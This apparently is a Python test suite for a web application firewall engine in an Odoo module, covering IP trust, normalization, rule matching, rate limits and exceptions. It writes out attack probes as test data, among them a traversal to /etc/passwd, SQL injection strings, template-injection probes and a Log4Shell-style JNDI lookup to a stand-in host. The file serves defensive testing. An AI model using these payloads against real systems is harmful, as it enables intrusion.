"""Pure-logic tests for the WAF engine (no HTTP, no DB writes)."""
import re
import time
from collections import deque

from odoo.tests import TransactionCase

from ..core import engine, iputil, middleware
from ..core.normalize import normalize, normalize_headers


class TestEngineCore(TransactionCase):

    # ------------------------------------------------------------------ ip trust

    def test_direct_connection_ignores_forwarding_headers(self):
        # attacker connecting straight to the odoo port tries to spoof
        ip = iputil.resolve_client_ip(
            "203.0.113.7", "127.0.0.1", "127.0.0.1", [])
        self.assertEqual(ip, "203.0.113.7")

    def test_x_real_ip_preferred_behind_trusted_proxy(self):
        ip = iputil.resolve_client_ip(
            "127.0.0.1", "2001:db8::5", "1.1.1.1, 2001:db8::5",
            iputil.parse_cidrs("127.0.0.0/8, ::1"))
        self.assertEqual(ip, "2001:db8::5")

    def test_xff_leftmost_spoof_ignored(self):
        # nginx forwards the *client-supplied* XFF value first, then appends
        # the real peer: "1.2.3.4, <real>" — we must take the real one.
        ip = iputil.resolve_client_ip(
            "127.0.0.1", None, "1.2.3.4, 5.6.7.8",
            iputil.parse_cidrs("127.0.0.0/8"))
        self.assertEqual(ip, "5.6.7.8")

    def test_xff_all_trusted_falls_back_to_peer(self):
        ip = iputil.resolve_client_ip(
            "127.0.0.1", None, "127.0.0.1",
            iputil.parse_cidrs("127.0.0.0/8"))
        self.assertEqual(ip, "127.0.0.1")

    # ------------------------------------------------------------- normalization

    def test_normalize_double_encoded_traversal(self):
        self.assertIn("../", normalize("/web/%252e%252e/etc/passwd"))

    def test_normalize_whitespace_and_comments(self):
        self.assertEqual(normalize("  UNION%0ASELECT  "), "union select")
        self.assertEqual(normalize("union/**/select"), "union select")

    def test_normalize_nullbyte_marker(self):
        self.assertIn("%00", normalize("/a\x00b"))

    # ----------------------------------------------------------------- rules

    def _snap(self, rules=None, ips=None, policies=None, exceptions=None,
              **cfg_over):
        config = {
            "mode": "enforce",
            "trusted_proxies": "127.0.0.0/8",
            "country_mode": "off",
            "body_scan_max": 65536,
            "auto_lockout_enabled": True,
            "auto_lockout_max": 3,
            "auto_lockout_window": 1,
            "auto_lockout_minutes": 1,
        }
        config.update(cfg_over)
        return engine.build_snapshot(config, rules or [], ips or [],
                                     policies=policies or [],
                                     exceptions=exceptions or [])

    def test_url_rule_blocks(self):
        snap = self._snap(rules=[{
            "id": 1, "code": "t1", "name": "dotenv", "category": "probes",
            "scope": "url", "pattern": r"\.env\b", "action": "block",
            "severity": 4, "no_session": False, "case_sensitive": False,
        }])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "path": "/%.env",
                                   "query": "", "ua": ""})
        self.assertTrue(d and d["action"] == "block")

    def test_no_session_rule_exempts_session_visitors(self):
        snap = self._snap(rules=[{
            "id": 2, "code": "t2", "name": "sqli", "category": "sqli",
            "scope": "query", "pattern": r"union\s+select", "action": "block",
            "severity": 5, "no_session": True, "case_sensitive": False,
        }])
        req = {"ip": "9.9.9.9", "path": "/web", "ua": "",
               "query": "x=union select", "has_session": True}
        self.assertIsNone(engine.evaluate(snap, req))
        req["has_session"] = False
        d = engine.evaluate(snap, req)
        self.assertTrue(d and d["action"] == "block")

    def test_allow_entry_wins_over_deny_and_rules(self):
        snap = self._snap(
            rules=[{"id": 3, "code": "t3", "name": "r", "category": "x",
                    "scope": "url", "pattern": ".", "action": "block",
                    "severity": 5, "no_session": False, "case_sensitive": False}],
            ips=[{"id": 1, "network": "9.9.0.0/16", "kind": "allow"},
                 {"id": 2, "network": "9.9.9.0/24", "kind": "deny"}],
        )
        self.assertIsNone(engine.evaluate(
            snap, {"ip": "9.9.9.9", "path": "/x", "query": "", "ua": ""}))

    def test_deny_entry_blocks_even_in_learning(self):
        snap = self._snap(mode="learning", ips=[
            {"id": 1, "network": "9.9.9.0/24", "kind": "deny",
             "reason": "bad", "expires": None}])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "path": "/", "query": "",
                                   "ua": ""})
        self.assertEqual(d["kind"], "ip")

    def test_expired_ip_entry_ignored(self):
        snap = self._snap(ips=[{"id": 1, "network": "9.9.9.9/32",
                                "kind": "deny", "expires": time.time() - 10}])
        self.assertIsNone(engine.evaluate(
            snap, {"ip": "9.9.9.9", "path": "/", "query": "", "ua": ""}))

    def test_country_mode_deny(self):
        snap = self._snap(country_mode="deny", country_codes=["CN"])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "path": "/", "query": "",
                                   "ua": ""}, country="CN")
        self.assertEqual(d["kind"], "country")

    def test_builtin_arith_ssti_rule(self):
        # pattern comes from the bundled pack itself: one source of truth
        rows = self.env["waf.rule"]._read_builtin_rules()
        rule = {r.get("id"): r for r in rows}["waf-ssti-arith-q"]
        snap = self._snap(rules=[{
            "id": 900, "code": rule["id"], "name": rule["name"],
            "category": rule["category"], "scope": "query",
            "pattern": rule["pattern"], "action": rule["action"],
            "severity": rule["severity"],
            "no_session": bool(rule.get("no_session", True)),
            "case_sensitive": False,
        }])
        def blocked(q):
            d = engine.evaluate(snap, {"ip": "9.9.9.9", "path": "/web",
                                       "query": q, "ua": ""})
            self.assertTrue(d and d["action"] == "block", q)
        def clean(q):
            self.assertIsNone(engine.evaluate(
                snap, {"ip": "9.9.9.9", "path": "/web", "query": q, "ua": ""}),
                q)
        for q in ("%7B%7B7*7%7D%7D", "{{7*7}}", "%24%7B7*7%7D",
                  "%7B%7B7%20*%207%7D%7D", "%24%7B7%2B7%7D", "{{ 12 - 3 }}"):
            blocked(q)
        # legit strings that must NOT trip the arithmetic probe
        for q in ("price=10*5", "n=7-3", "%7B%7Bproduct.name%7D%7D",
                  "%7B%7Btotal+%7D%7D", "%7B%7B7a7%7D%7D"):
            clean(q)

    def test_auto_rule_triggers_lockout(self):
        snap = self._snap(rules=[{
            "id": 4, "code": "t4", "name": "probe", "category": "probes",
            "scope": "url", "pattern": "/probe", "action": "auto",
            "severity": 4, "no_session": False, "case_sensitive": False,
        }])
        counters = {}
        req = {"ip": "8.8.8.8", "path": "/probe", "query": "", "ua": ""}
        for _ in range(2):
            d = engine.evaluate(snap, req, counters=counters)
            self.assertNotIn("trigger_lockout", d)
        d = engine.evaluate(snap, req, counters=counters)
        self.assertTrue(d.get("trigger_lockout"))
        self.assertEqual(d["action"], "block")

    def test_static_skips_query_and_body_rules(self):
        snap = self._snap(rules=[{
            "id": 5, "code": "t5", "name": "q", "category": "x", "scope": "query",
            "pattern": ".", "action": "block", "severity": 5,
            "no_session": False, "case_sensitive": False,
        }])
        req = {"ip": "9.9.9.9", "path": "/web/static/x.js", "query": "anything",
               "ua": "", "static": True}
        self.assertIsNone(engine.evaluate(snap, req))

    def test_broken_rule_skipped_not_fatal(self):
        snap = self._snap(rules=[{
            "id": 6, "code": "t6", "name": "bad", "category": "x", "scope": "url",
            "pattern": "([unclosed", "action": "block", "severity": 5,
            "no_session": False, "case_sensitive": False,
        }])
        self.assertIsNone(engine.evaluate(
            snap, {"ip": "9.9.9.9", "path": "/x", "query": "", "ua": ""}))

    def test_headers_blob_covers_all_headers_within_caps(self):
        # review P2 (live waf-test run): header-scoped rules must see more
        # than the proxy headers -- the canonical Log4Shell vector hides
        # in User-Agent / arbitrary custom headers
        environ = {
            "REQUEST_METHOD": "GET",
            "HTTP_USER_AGENT": "curl/8.5.0",
            "HTTP_X_WAFPROBE": "${jndi:ldap://probe.invalid/a}",
            "HTTP_COOKIE": "session_id=abc",
            "HTTP_SEC_WEBSOCKET_KEY": "dGVzdA==",
            "HTTP_X_HUGE": "y" * 6000,
        }
        blob = normalize_headers(
            environ, ["x-forwarded-for", "x-real-ip", "x-forwarded-host",
                      "referer"])
        self.assertIn("curl/8.5.0", blob)
        self.assertIn("${jndi:ldap://probe.invalid/a}", blob)
        self.assertNotIn("dGVzdA==", blob)      # noise headers skipped
        self.assertLess(len(blob), 9000)        # caps bound the cost

    def test_duplicate_proxy_header_values_collapsed(self):
        # live waf-test false positive: LB + nginx emit X-Real-IP twice
        # with identical values on every request; that shape must collapse
        # before matching, while differing values and non-IP list headers
        # (host/referer style commas) survive untouched
        environ = {
            "HTTP_X_REAL_IP": "203.0.113.77, 203.0.113.77",
            "HTTP_X_FORWARDED_FOR": ", 198.51.100.4",
            "HTTP_X_FORWARDED_HOST": "a.example, b.example",
        }
        blob = normalize_headers(environ, ["x-forwarded-for", "x-real-ip",
                                           "x-forwarded-host"])
        self.assertEqual(
            blob,
            "x-forwarded-for:198.51.100.4\n"
            "x-real-ip:203.0.113.77\n"
            "x-forwarded-host:a.example, b.example")

    def test_trusted_hops_pruned_from_ip_list_headers(self):
        # live waf-test topology: LB + nginx emit X-Real-IP
        # "client, <own-hop>" on every request; hops inside the
        # configured trusted proxies are own infrastructure and must
        # not trip the multiple-value rule. Foreign extra values --
        # the real smuggling shape -- survive untouched.
        from ..core.iputil import parse_cidrs
        environ = {
            "HTTP_X_REAL_IP": "91.141.151.51, 141.147.65.10",
            "HTTP_X_FORWARDED_FOR": "91.141.151.51, 141.147.65.10",
        }
        blob = normalize_headers(
            environ, ["x-forwarded-for", "x-real-ip"],
            trusted=parse_cidrs("141.147.65.0/24"))
        self.assertEqual(blob, "x-forwarded-for:91.141.151.51\n"
                               "x-real-ip:91.141.151.51")
        blob = normalize_headers(
            environ, ["x-forwarded-for", "x-real-ip"],
            trusted=parse_cidrs("10.0.0.0/8"))
        self.assertIn("91.141.151.51, 141.147.65.10", blob)

    def test_qweb_rule_cost_is_bounded(self):
        # review F01: the bundled pattern used `[^>]*`, so '<t ' fragments
        # without a closing '>' made re.search rescan a large suffix from
        # every start position -- measured ~3.8 s for one 64 KB non-matching
        # body, no regex timeout, no counter help (it never matches): the
        # WAF itself was the DoS. The fixed pattern constrains the
        # attribute class to [^<>]* and stays ~linear.
        rows = self.env["waf.rule"]._read_builtin_rules()
        rule = {r.get("id"): r for r in rows}["waf-ssti-qweb-b"]
        snap = self._snap(rules=[{
            "id": 901, "code": rule["id"], "name": rule["name"],
            "category": rule["category"], "scope": "body",
            "pattern": rule["pattern"], "action": rule["action"],
            "severity": rule["severity"],
            "no_session": bool(rule.get("no_session", True)),
            "case_sensitive": False,
        }])

        def check(text):
            return engine.evaluate(snap, {"ip": "9.9.9.9", "path": "/x",
                                          "query": "", "ua": "",
                                          "norm_body": text})

        worst = 0.0
        for size in (8190, 32766, 65535):  # within the default body cap
            payload = "<t " * (size // 3)
            t0 = time.perf_counter()
            self.assertIsNone(check(payload),
                              "adversarial filler must not match")
            worst = max(worst, time.perf_counter() - t0)
        # the old pattern needed 3.8 s HERE; allow generous CI margin
        self.assertLess(worst, 0.25,
                        "inspection cost must stay bounded/~linear")
        # detection semantics preserved on real QWeb probes
        for payload in ('<t t-esc="widget.value"/>',
                        '<div><t t-if="x" t-out="y">z</t></div>',
                        '<t t-set="a" t-value="1"/>'):
            d = check(payload)
            self.assertTrue(d and d["action"] == "block", payload)

    def test_exempt_session_skips_no_session_rule_cost(self):
        # review F01 note: the no_session exemption must also skip the
        # regex WORK, not just flip the verdict afterwards. A payload the
        # exempt rule WOULD match is never even scanned once the view is
        # precomputed at snapshot build time.
        rule = {"id": 902, "code": "t902", "name": "sqli", "category": "sqli",
                "scope": "query", "pattern": r"union\s+select",
                "action": "block", "severity": 5, "no_session": True,
                "case_sensitive": False}
        snap = self._snap(rules=[rule])
        self.assertNotIn(902, [r["id"] for r in snap["rules_no_exempt"]["query"]])
        self.assertIn(902, [r["id"] for r in snap["rules"]["query"]])

    def test_local_counter_map_is_bounded(self):
        # review F07: rotating source addresses (esp. IPv6) must not grow
        # the worker-local fallback dict without bound. Stale keys are
        # evicted first; a flood of fresh keys alone triggers a hard clear.
        snap = self._snap(rules=[{
            "id": 903, "code": "t903", "name": "probe", "category": "probes",
            "scope": "url", "pattern": "/probe", "action": "auto",
            "severity": 4, "no_session": False, "case_sensitive": False,
        }])
        req = {"ip": "8.8.8.8", "path": "/probe", "query": "", "ua": ""}
        base = time.time()

        counters = {}
        for i in range(6000):  # distinct, every window long expired
            counters["10.%d.%d.%d" % (i // 65536 % 256, i // 256 % 256,
                                      i % 256)] = deque([base - 99999])
        d = engine.evaluate(snap, req, counters=counters)
        self.assertLessEqual(len(counters), engine.COUNTER_MAX_KEYS)
        self.assertEqual(d["auto_hits"], 1, "the live hit survives")

        counters = {("9.%d.%d.%d" % (i // 65536 % 256, i // 256 % 256,
                                     i % 256)): deque([base])
                    for i in range(6000)}  # all fresh: purge finds nothing
        d = engine.evaluate(snap, req, counters=counters)
        self.assertLessEqual(len(counters), engine.COUNTER_MAX_KEYS,
                             "hard ceiling even when every key is fresh")

    # ------------------------------------------------- endpoint policies (19.0.2.6.0)

    def _pol(self, **over):
        row = {"id": 10, "code": "ep1", "name": "db manager", "category": "odoo",
               "route_re": r"^/web/database(?:/|$)", "methods": "",
               "rpc_service": "", "rpc_model": "", "rpc_method": "",
               "ids_max": 0, "action": "block", "severity": 4,
               "exempt_nets": "", "rate_max": 0, "rate_window": 10,
               "rate_key": "ip", "rate_param": "login",
               "rate_block_minutes": 0, "on_unverified": "off",
               "apply_pre_db": False}
        row.update(over)
        return row

    def test_endpoint_policy_covers_whole_route_group(self):
        snap = self._snap(policies=[self._pol()])
        for path in ("/web/database/selector", "/web/database/manager",
                     "/web/database/create", "/web/database/duplicate",
                     "/web/database/change_password", "/web/database/list"):
            d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                       "path": path, "query": "", "ua": ""})
            self.assertTrue(d and d["action"] == "block", path)
            self.assertEqual(d["kind"], "endpoint")
        # boundaries: never bleed onto the backend or lookalike prefixes
        for path in ("/web", "/web/login", "/odoo", "/odoo/web",
                     "/web/dataset/call_kw", "/web/databaseX"):
            self.assertIsNone(engine.evaluate(
                snap, {"ip": "9.9.9.9", "method": "GET", "path": path,
                       "query": "", "ua": ""}), path)

    def test_endpoint_policy_methods_and_exempt_nets(self):
        snap = self._snap(policies=[self._pol(methods="POST",
                                              exempt_nets="203.0.113.0/24")])
        # method scoping
        self.assertIsNone(engine.evaluate(
            snap, {"ip": "9.9.9.9", "method": "GET", "path": "/web/database/x",
                   "query": "", "ua": ""}))
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "POST",
                                   "path": "/web/database/x", "query": "",
                                   "ua": ""})
        self.assertEqual(d["action"], "block")
        # trusted management network exception (this policy only)
        self.assertIsNone(engine.evaluate(
            snap, {"ip": "203.0.113.7", "method": "POST",
                   "path": "/web/database/x", "query": "", "ua": ""}))
        # adjacent net is NOT exempt
        d = engine.evaluate(snap, {"ip": "203.0.112.7", "method": "POST",
                                   "path": "/web/database/x", "query": "",
                                   "ua": ""})
        self.assertEqual(d["action"], "block")

    def test_rpc_service_matcher_is_exact_not_substring(self):
        # the whole point of structured matching: the SERVICE field of the
        # parsed envelope decides, never incidental "db" text in business
        # data (a database/model/arg literally named "db" must not fire)
        snap = self._snap(policies=[self._pol(
            id=11, code="ep-db-rpc", route_re=r"^/jsonrpc$",
            rpc_service="db")])
        self.assertTrue(snap["wants_rpc"])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "POST",
                                   "path": "/jsonrpc", "query": "", "ua": "",
                                   "rpc": {"fields": {"service": "db",
                                                     "method": "list"}}})
        self.assertEqual(d["action"], "block")
        # execute_kw(db, uid, pw, model, method): args[0] IS literally "db"
        # but the SERVICE is "object" -> must not fire
        self.assertIsNone(engine.evaluate(
            snap, {"ip": "9.9.9.9", "method": "POST", "path": "/jsonrpc",
                   "query": "", "ua": "",
                   "rpc": {"fields": {"service": "object",
                                      "method": "execute_kw",
                                      "kw_method": "read"}}}))
        # lookalike service values must not fire either
        for svc in ("dbx", "x-db", "db_admin"):
            self.assertIsNone(engine.evaluate(
                snap, {"ip": "9.9.9.9", "method": "POST", "path": "/jsonrpc",
                       "query": "", "ua": "",
                       "rpc": {"fields": {"service": svc}}}), svc)
        # no structured context at all -> policy cannot fire (fail open on
        # missing evidence; the app rejects such bodies itself)
        self.assertIsNone(engine.evaluate(
            snap, {"ip": "9.9.9.9", "method": "POST", "path": "/jsonrpc",
                   "query": "", "ua": ""}))

    def test_rate_key_shapes_and_target_hashing(self):
        snap = self._snap(policies=[
            self._pol(id=12, code="ep-ip", rate_max=5),
            self._pol(id=13, code="ep-user", route_re=r"^/u$",
                      rate_max=5, rate_key="user"),
            self._pol(id=14, code="ep-ipuser", route_re=r"^/iu$",
                      rate_max=5, rate_key="ip_user"),
            self._pol(id=15, code="ep-target", route_re=r"^/t$",
                      rate_max=5, rate_key="target", rate_param="login"),
        ])
        base = {"query": "", "ua": "", "ip": "9.9.9.9", "method": "POST"}
        d = engine.evaluate(snap, dict(base, path="/web/database/x"))
        self.assertEqual(d["rates"][0]["key"], "p12:9.9.9.9")
        d = engine.evaluate(snap, dict(base, path="/u", uid=7))
        self.assertEqual(d["rates"][0]["key"], "p13:u7")
        d = engine.evaluate(snap, dict(base, path="/u"))  # no uid -> IP
        self.assertEqual(d["rates"][0]["key"], "p13:9.9.9.9")
        d = engine.evaluate(snap, dict(base, path="/iu", uid=7))
        self.assertEqual(d["rates"][0]["key"], "p14:9.9.9.9|u7")
        d = engine.evaluate(snap, dict(
            base, path="/t",
            rpc={"fields": {"login": "victim@example.com"}}))
        self.assertTrue(d["rates"][0]["key"].startswith("p15:t:login:"))
        self.assertNotIn("victim", d["rates"][0]["key"],
                        "the reset target must never sit verbatim in the "
                        "counter table either")
        # no login param -> nothing attributable, no rate attach
        self.assertNotIn("rates", engine.evaluate(snap, dict(base, path="/t")))

    def test_two_rate_policies_on_one_route_both_tick(self):
        # the /web/reset_password surface: per-IP AND per-account counters
        # coexist; BOTH must tick on every matching request (a single-policy
        # match silently starved the second group in early round-11 code)
        snap = self._snap(policies=[
            self._pol(id=21, code="ep-reset-ip", route_re=r"^/reset$",
                      action="log", rate_max=100),
            self._pol(id=22, code="ep-reset-acct", route_re=r"^/reset$",
                      action="log", rate_max=5, rate_key="target",
                      rate_param="login"),
        ])
        req = {"ip": "9.9.9.9", "method": "POST", "path": "/reset",
               "query": "", "ua": "",
               "rpc": {"fields": {"login": "someone@example.com"}}}
        d = engine.evaluate(snap, req)
        keys = sorted(r["key"] for r in d["rates"])
        self.assertEqual(keys[0], "p21:9.9.9.9")
        self.assertTrue(keys[1].startswith("p22:t:login:"))
        self.assertEqual({r["code"] for r in d["rates"]},
                         {"ep-reset-ip", "ep-reset-acct"})
        # the log-only-but-blocking mix: strongest verdict still decides
        snap = self._snap(policies=[
            self._pol(id=23, code="ep-l", route_re=r"^/m$", action="log",
                      severity=4, rate_max=9),
            self._pol(id=24, code="ep-b", route_re=r"^/m$", action="block",
                      severity=4),
        ])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                   "path": "/m", "query": "", "ua": ""})
        self.assertEqual(d["action"], "block")
        self.assertEqual(d["rule_code"], "ep-b")
        self.assertEqual(len(d["rates"]), 1)  # only the rated one attaches

    def test_ids_limit_marks_and_forces_log(self):
        snap = self._snap(policies=[self._pol(
            id=16, code="ep-rep", route_re=r"^/report/", ids_max=2,
            action="log", severity=3, rate_max=100, rate_key="ip_user")])
        self.assertTrue(snap["wants_ids"])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                   "path": "/report/pdf/r/1,2,3,4",
                                   "query": "", "ua": "", "ids_count": 4})
        self.assertEqual(d["action"], "log")
        self.assertIn("4 document ids > limit 2", d["rule_name"])
        self.assertTrue(d.get("force_log"))
        # below the limit: counter still ticks, but no forced log note
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                   "path": "/report/pdf/r/1", "query": "",
                                   "ua": "", "ids_count": 1})
        self.assertIn("rates", d)
        self.assertNotIn("force_log", d)

    def test_ids_limit_gates_an_unrated_policy(self):
        # ids_max WITHOUT a rate limit is the fire threshold, not just a
        # note: below/at the limit the surface is ordinary traffic (no
        # decision), above it the policy acts. (With a rate limit the rate
        # does the gating and ids_max stays a visible mark -- that is the
        # shipped report policy shape.)
        snap = self._snap(policies=[self._pol(
            id=25, code="ep-ids", route_re=r"^/report/", ids_max=2,
            action="block")])
        req = {"ip": "9.9.9.9", "method": "GET", "query": "", "ua": ""}
        self.assertIsNone(engine.evaluate(
            snap, dict(req, path="/report/pdf/r/1,2", ids_count=2)))
        self.assertIsNone(engine.evaluate(
            snap, dict(req, path="/report/pdf/r/1")))  # no evidence -> open
        d = engine.evaluate(
            snap, dict(req, path="/report/pdf/r/1,2,3", ids_count=3))
        self.assertEqual(d["action"], "block")
        self.assertIn("3 document ids > limit 2", d["rule_name"])

    def test_endpoint_block_credits_lockout_rate_policies_do_not(self):
        counters = {}
        snap = self._snap(policies=[self._pol()])
        d = engine.evaluate(snap, {"ip": "8.8.8.8", "method": "GET",
                                   "path": "/web/database/x", "query": "",
                                   "ua": ""}, counters=counters)
        self.assertTrue(d.get("lockout_credit"),
                        "probe flood on a blocked route group credits "
                        "the shared attack counter")
        counters = {}
        snap = self._snap(policies=[self._pol(rate_max=5)])
        d = engine.evaluate(snap, {"ip": "8.8.8.8", "method": "GET",
                                   "path": "/web/database/x", "query": "",
                                   "ua": ""}, counters=counters)
        self.assertNotIn("lockout_credit", d,
                        "rate policies own their shared counters; "
                        "double-credit would double-punish")

    def test_rule_outvoting_policy_still_ticks_the_rate(self):
        snap = self._snap(
            rules=[{"id": 50, "code": "t50", "name": "tooling",
                    "category": "scanners", "scope": "ua", "pattern": "sqlmap",
                    "action": "block", "severity": 5, "no_session": False,
                    "case_sensitive": False}],
            policies=[self._pol(id=17, code="ep-signup",
                                route_re=r"^/web/signup$", methods="POST",
                                rate_max=4)])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "POST",
                                   "path": "/web/signup", "query": "",
                                   "ua": "sqlmap/1.7"})
        self.assertEqual(d["kind"], "rule")  # signature wins the verdict
        self.assertEqual(d["rates"][0]["key"], "p17:9.9.9.9")  # counter counts

    def test_exception_downgrades_scoped_and_expires(self):
        pol = self._pol(id=18, code="ep-x")
        exc = {"id": 1, "rule_id": None, "rule_code": None,
               "policy_id": 18, "policy_code": "ep-x",
               "route_re": r"^/web/database/selector$", "methods": "GET",
               "param": "", "reason": "office vpn", "expires": None}
        snap = self._snap(policies=[pol], exceptions=[exc])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                   "path": "/web/database/selector",
                                   "query": "", "ua": ""})
        self.assertEqual(d["action"], "log")  # downgraded, never hidden
        self.assertIn("[excepted: office vpn]", d["rule_name"])
        # scope holds: other methods/routes keep the block
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "POST",
                                   "path": "/web/database/selector",
                                   "query": "", "ua": ""})
        self.assertEqual(d["action"], "block")
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "GET",
                                   "path": "/web/database/manager",
                                   "query": "", "ua": ""})
        self.assertEqual(d["action"], "block")
        # expired exception is inert (build-time AND match-time)
        exc2 = dict(exc, expires=time.time() - 10)
        snap2 = self._snap(policies=[pol], exceptions=[exc2])
        self.assertEqual(snap2["exceptions"], [])
        d = engine.evaluate(snap2, {"ip": "9.9.9.9", "method": "GET",
                                    "path": "/web/database/selector",
                                    "query": "", "ua": ""})
        self.assertEqual(d["action"], "block")

    def test_exception_param_scope_and_rate_strip(self):
        # an exception on a RATE policy must also stop the counter from
        # counting the trusted traffic (scoped by structured param)
        pol = self._pol(id=19, code="ep-rate", route_re=r"^/t$",
                        rate_max=5, rate_key="target", rate_param="login")
        exc = {"id": 2, "rule_id": None, "rule_code": None,
               "policy_id": 19, "policy_code": "ep-rate", "route_re": "",
               "methods": "", "param": "login=svc@account.nl",
               "reason": "nightly sync", "expires": None}
        snap = self._snap(policies=[pol], exceptions=[exc])
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "POST",
                                   "path": "/t", "query": "", "ua": "",
                                   "rpc": {"fields": {"login": "svc@account.nl"}}})
        self.assertNotIn("rates", d)
        self.assertEqual(d["action"], "log")
        # another target: protection untouched, rate attached
        d = engine.evaluate(snap, {"ip": "9.9.9.9", "method": "POST",
                                   "path": "/t", "query": "", "ua": "",
                                   "rpc": {"fields": {"login": "other@x.nl"}}})
        self.assertIn("rates", d)

    # ------------------------------------- round-12 review regressions

    def test_exception_on_one_rule_keeps_independent_block(self):
        # review 12-1: exception scoped to the STRONGER rule must not
        # silence an independent block from a weaker rule on the same
        # request (old engine applied exceptions to the merged decision)
        rules = [
            {"id": 60, "code": "p12-xss", "name": "xss probe",
             "category": "xss", "scope": "query", "pattern": r"<script",
             "action": "block", "severity": 5, "no_session": False,
             "case_sensitive": False},
            {"id": 61, "code": "p12-sqli", "name": "sqli probe",
             "category": "sqli", "scope": "query",
             "pattern": r"union\s+select", "action": "block", "severity": 4,
             "no_session": False, "case_sensitive": False},
        ]
        exc = {"id": 9, "rule_id": 60, "rule_code": None, "policy_id": None,
               "policy_code": None, "route_re": "", "methods": "", "param": "",
               "reason": "trusted form", "expires": None}
        snap = self._snap(rules=rules, exceptions=[exc])
        req = {"ip": "9.9.9.9", "method": "GET", "path": "/x", "ua": ""}
        d = engine.evaluate(snap, dict(
            req, query="a=<script> &b=union select"))
        self.assertEqual(d["action"], "block")
        self.assertEqual(d["rule_code"], "p12-sqli")
        self.assertNotIn("excepted_by", d)
        # the exception still fully covers its OWN rule
        d = engine.evaluate(snap, dict(req, query="a=<script>only"))
        self.assertEqual(d["action"], "log")
        self.assertIn("[excepted: trusted form]", d["rule_name"])
        self.assertEqual(d["excepted_by"], 9)

    def test_exception_on_one_policy_keeps_other_verdicts(self):
        # review 12-1: an exception scoped to one covering policy may only
        # downgrade THAT policy -- other policies' blocks and counters
        # survive unchanged.
        pols = [
            self._pol(id=30, code="ep-blk", route_re=r"^/j$", action="block",
                      severity=4),
            self._pol(id=31, code="ep-mon", route_re=r"^/j$", action="log",
                      severity=2, rate_max=100),
        ]
        exc = {"id": 10, "rule_id": None, "rule_code": None,
               "policy_id": 31, "policy_code": "ep-mon", "route_re": "",
               "methods": "", "param": "", "reason": "internal",
               "expires": None}
        snap = self._snap(policies=pols, exceptions=[exc])
        req = {"ip": "9.9.9.9", "method": "POST", "path": "/j", "query": "",
               "ua": ""}
        d = engine.evaluate(snap, req)
        self.assertEqual(d["action"], "block")
        self.assertEqual(d["rule_code"], "ep-blk")
        self.assertTrue(d["block_unconditional"])
        self.assertNotIn("rates", d,
                         "the excepted policy stops counting itself...")
        # ... but an exception on the BLOCKING policy must not strip the
        # monitoring policy's counter, and only downgrades to log.
        snap2 = self._snap(policies=pols,
                           exceptions=[dict(exc, policy_id=30,
                                            policy_code="ep-blk")])
        d = engine.evaluate(snap2, req)
        self.assertEqual(d["action"], "log")
        self.assertEqual(d["rule_code"], "ep-blk")
        self.assertIn("[excepted: internal]", d["rule_name"])
        self.assertEqual(len(d["rates"]), 1,
                         "the unrelated policy keeps its counter")
        self.assertEqual(d["rates"][0]["key"], "p31:9.9.9.9")
        self.assertFalse(d["block_unconditional"])

    def test_monitoring_policy_cannot_disable_unconditional_block(self):
        # review 12-2: policy A blocks the db service unconditionally;
        # policy B is a monitoring rate policy on the same route. The
        # mere presence of B's counters must not turn A's block into a
        # threshold-dependent decision.
        pols = [
            self._pol(id=42, code="ep-db", route_re=r"^/jsonrpc$",
                      rpc_service="db", action="block", severity=4),
            self._pol(id=43, code="ep-mon", route_re=r"^/jsonrpc$",
                      action="log", severity=2, rate_max=100),
        ]
        snap = self._snap(policies=pols)
        req = {"ip": "9.9.9.9", "method": "POST", "path": "/jsonrpc",
               "query": "", "ua": "",
               "rpc": {"fields": {"service": "db", "method": "list"}}}
        d = engine.evaluate(snap, req)
        self.assertEqual(d["action"], "block")
        self.assertEqual(d["rule_code"], "ep-db")
        self.assertTrue(d["block_unconditional"])
        self.assertTrue(d["unthrottled"])
        self.assertEqual(len(d["rates"]), 1, "the monitor still counts")
        # a non-matching service: only the monitoring policy covers it,
        # and that one IS threshold-dependent (below limit -> no event)
        d = engine.evaluate(snap, dict(
            req, rpc={"fields": {"service": "common"}}))
        self.assertEqual(d["action"], "log")
        self.assertFalse(d.get("block_unconditional"))
        self.assertTrue(d.get("rates"))

    def test_counters_namespaced_per_policy(self):
        # review 12-4: signup flood + reset flood from one IP must not
        # add up to one shared "11 in 10 min" counter
        pols = [
            self._pol(id=40, code="ep-signup", route_re=r"^/web/signup$",
                      methods="POST", action="block", rate_max=15),
            self._pol(id=41, code="ep-resetip",
                      route_re=r"^/web/reset_password$", methods="POST",
                      action="block", rate_max=10),
        ]
        snap = self._snap(policies=pols)
        req = {"ip": "9.9.9.9", "method": "POST", "query": "", "ua": ""}
        d = engine.evaluate(snap, dict(req, path="/web/signup"))
        self.assertEqual(d["rates"][0]["key"], "p40:9.9.9.9")
        d = engine.evaluate(snap, dict(req, path="/web/reset_password"))
        self.assertEqual(d["rates"][0]["key"], "p41:9.9.9.9")

    def test_on_unverified_fails_closed_for_hidden_operations(self):
        # review 12-5: a body padded past the RPC parse cap hides the
        # operation; policies that opted into on_unverified="match"
        # treat the hidden operation as matching, others still cannot
        # fire on missing evidence.
        pols = [
            self._pol(id=44, code="ep-db-on", route_re=r"^/jsonrpc$",
                      rpc_service="db", action="block",
                      on_unverified="match"),
            self._pol(id=45, code="ep-db-off",
                      route_re=r"^/web/dataset/call_kw", rpc_service="db",
                      action="block", on_unverified="off"),
        ]
        snap = self._snap(policies=pols)
        unv = {"ip": "9.9.9.9", "method": "POST", "path": "/jsonrpc",
               "query": "", "ua": "",
               "rpc": {"fields": {}, "unverified": True}}
        d = engine.evaluate(snap, unv)
        self.assertEqual(d["action"], "block")
        self.assertEqual(d["rule_code"], "ep-db-on")
        self.assertTrue(d["block_unconditional"])
        # the classic policy (off): the same hidden shape cannot fire
